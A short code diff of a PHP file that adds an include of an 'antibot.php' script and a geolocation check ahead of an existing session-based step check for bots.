@@ -1,5 +1,7 @@
 <?php
 session_start();
+require_once dirname(__DIR__) . '/antibot.php';
+checkGeolocation();
 
 // Antibot check logic
 if (!isset($_SESSION['STEP_CHAIN']) || $_SESSION['STEP_CHAIN'] < 3) {
